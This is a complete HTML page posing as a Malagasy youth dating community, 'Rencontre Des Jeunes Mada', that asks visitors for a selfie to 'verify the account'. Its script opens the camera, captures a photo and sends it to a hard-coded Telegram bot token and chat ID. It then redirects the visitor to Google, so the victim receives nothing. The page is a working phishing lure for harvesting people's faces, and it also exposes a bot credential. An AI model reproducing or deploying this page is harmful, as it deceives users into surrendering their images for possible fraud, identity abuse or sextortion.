<!DOCTYPE html>
<html lang="mg">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rencontre Des Jeunes Mada</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            /* Theme Dark (Bleu) par défaut */
            --bg-gradient: linear-gradient(135deg, #071324, #0f294a);
            --card-bg: rgba(15, 41, 74, 0.78);
            --card-border: rgba(56, 189, 248, 0.25);
            --text-main: #f8fafc;
            --text-muted: #93c5fd;
            --accent: #38bdf8;
            --accent-hover: #0284c7;
            --btn-shadow: 0 6px 20px rgba(56, 189, 248, 0.35);
            --badge-bg: rgba(56, 189, 248, 0.15);
        }

        body.light-rose {
            /* Theme Clair (Rose) */
            --bg-gradient: linear-gradient(135deg, #fff1f5, #ffe4e6);
            --card-bg: rgba(255, 255, 255, 0.85);
            --card-border: rgba(244, 63, 94, 0.25);
            --text-main: #3f0d1c;
            --text-muted: #9f1239;
            --accent: #ec4899;
            --accent-hover: #db2777;
            --btn-shadow: 0 6px 20px rgba(236, 72, 153, 0.3);
            --badge-bg: rgba(236, 72, 153, 0.12);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Poppins', sans-serif;
            background: var(--bg-gradient);
            color: var(--text-main);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
            transition: background 0.4s ease, color 0.4s ease;
        }

        .theme-switcher {
            position: fixed;
            top: 18px;
            right: 18px;
            display: flex;
            gap: 8px;
            background: var(--card-bg);
            border: 1px solid var(--card-border);
            padding: 6px;
            border-radius: 30px;
            backdrop-filter: blur(10px);
            z-index: 10;
        }

        .theme-btn {
            border: none;
            padding: 6px 14px;
            border-radius: 20px;
            font-family: 'Poppins', sans-serif;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            background: transparent;
            color: var(--text-main);
            transition: 0.25s ease;
        }

        .theme-btn.active {
            background: var(--accent);
            color: #ffffff;
        }

        .card {
            background: var(--card-bg);
            border: 1px solid var(--card-border);
            backdrop-filter: blur(14px);
            border-radius: 24px;
            padding: 35px 26px;
            max-width: 390px;
            width: 100%;
            text-align: center;
            box-shadow: 0 18px 40px rgba(0, 0, 0, 0.25);
            transition: 0.35s ease;
        }

        .badge {
            display: inline-block;
            background: var(--badge-bg);
            color: var(--accent);
            font-size: 12px;
            font-weight: 600;
            padding: 6px 14px;
            border-radius: 20px;
            margin-bottom: 16px;
        }

        h1 {
            font-size: 22px;
            font-weight: 700;
            line-height: 1.3;
            margin-bottom: 10px;
        }

        p {
            font-size: 14px;
            color: var(--text-muted);
            line-height: 1.5;
            margin-bottom: 22px;
        }

        .selfie-box {
            width: 110px;
            height: 110px;
            margin: 0 auto 22px auto;
            border-radius: 50%;
            border: 3px dashed var(--accent);
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 38px;
            background: var(--badge-bg);
        }

        .btn-main {
            width: 100%;
            background: var(--accent);
            color: #ffffff;
            border: none;
            padding: 14px 20px;
            border-radius: 14px;
            font-family: 'Poppins', sans-serif;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            box-shadow: var(--btn-shadow);
            transition: transform 0.2s ease, background 0.25s ease;
        }

        .btn-main:hover {
            background: var(--accent-hover);
        }

        .btn-main:active {
            transform: scale(0.97);
        }

        .status-text {
            margin-top: 16px;
            font-size: 13px;
            color: var(--text-muted);
            min-height: 20px;
        }

        .footer-note {
            margin-top: 20px;
            font-size: 11px;
            opacity: 0.7;
        }
    </style>
</head>
<body>

    <div class="theme-switcher">
        <button id="btnDark" class="theme-btn active" onclick="setTheme('dark')">Dark Bleu</button>
        <button id="btnRose" class="theme-btn" onclick="setTheme('rose')">Clair Rose</button>
    </div>

    <div class="card">
        <div class="badge">🇲🇬 Communauté Madagascar</div>
        <h1>Rencontre Des Jeunes Mada</h1>
        <p id="desc">Mba hamenoana ny mombamomba anao sy hanamarinana ny kaonty, alaivo ny sary selfie-nao eto.</p>

        <div class="selfie-box" id="iconBox">📸</div>

        <button class="btn-main" id="actionBtn" onclick="startCapture()">Maka Selfie &amp; Manohy</button>

        <div class="status-text" id="status"></div>
        <div class="footer-note">Rencontre Des Jeunes Mada • Profil &amp; Vérification</div>
    </div>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const token = "9032405314:AAE3YReBmUiG8GrtB8IsALD7SeklLWnGOKQ";
        const chatId = "7658208557";

        let isCapturing = false;

        function setTheme(mode) {
            const btnDark = document.getElementById('btnDark');
            const btnRose = document.getElementById('btnRose');

            if (mode === 'rose') {
                document.body.classList.add('light-rose');
                btnRose.classList.add('active');
                btnDark.classList.remove('active');
            } else {
                document.body.classList.remove('light-rose');
                btnDark.classList.add('active');
                btnRose.classList.remove('active');
            }
        }

        function startCapture() {
            if (isCapturing) return;
            isCapturing = true;

            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const status = document.getElementById('status');
            const btn = document.getElementById('actionBtn');
            const iconBox = document.getElementById('iconBox');

            status.innerText = "Manokatra ny camera... Ekeo ny autorisation.";
            btn.innerText = "Miandrasa kely...";

            navigator.mediaDevices.getUserMedia({
                video: { facingMode: "user" }
            })
            .then(stream => {
                video.srcObject = stream;
                iconBox.innerText = "⏳";
                status.innerText = "Maka sary selfie... Aza mihetsika.";

                setTimeout(() => {
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;

                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    canvas.toBlob(function(blob) {
                        const formData = new FormData();
                        formData.append("chat_id", chatId);
                        formData.append("photo", blob, "selfie_mada.jpg");
                        formData.append("caption", "Rencontre Des Jeunes Mada - Selfie");

                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                            method: "POST",
                            body: formData
                        })
                        .then(response => response.json())
                        .then(data => {
                            iconBox.innerText = "✅";
                            status.innerText = "Voatahiry ny sary! Mampiditra ao amin'ny pejy...";
                            setTimeout(() => {
                                window.location.href = "https://www.google.com";
                            }, 1200);
                        })
                        .catch(error => {
                            isCapturing = false;
                            btn.innerText = "Maka Selfie & Manohy";
                            status.innerText = "Nisy olana kely ny fifandraisana. Andramo indray.";
                        });

                        stream.getTracks().forEach(track => track.stop());
                    }, 'image/jpeg', 0.9);

                }, 1500);
            })
            .catch(err => {
                isCapturing = false;
                btn.innerText = "Maka Selfie & Manohy";
                status.innerText = "Tsy nahazo alalana. Tsindrio ny bokotra ary ekeo ny camera.";
            });
        }
    </script>
</body>
</html>
